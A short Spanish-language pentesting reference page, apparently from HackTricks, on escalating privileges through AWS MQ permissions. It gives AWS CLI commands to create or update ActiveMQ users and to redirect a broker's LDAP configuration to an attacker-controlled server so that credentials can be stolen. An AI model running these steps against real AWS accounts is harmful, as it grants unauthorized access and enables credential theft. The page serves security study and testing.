# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Para más información sobre MQ, consulta:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Con esos permisos puedes **crear un nuevo usuario en un ActimeMQ broker** (esto no funciona en RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto potencial:** Acceso a información sensible al navegar por ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Con esos permisos puedes **crear un nuevo usuario en un broker ActimeMQ** (esto no funciona en RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto potencial:** Acceso a información sensible al navegar por ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Si un broker está usando **LDAP** para autorización con **ActiveMQ**, es posible **cambiar** la **configuración** del servidor LDAP utilizado por uno controlado por el atacante. De este modo, el atacante podrá **robar todas las credenciales enviadas a través de LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Si de alguna manera pudieras encontrar las credenciales originales usadas por ActiveMQ, podrías realizar un MitM, robar las creds, usarlas en el servidor original y enviar la respuesta (quizá con solo reutilizar las creds robadas podrías hacerlo).

**Impacto potencial:** Robar credenciales de ActiveMQ

{{#include ../../../../banners/hacktricks-training.md}}
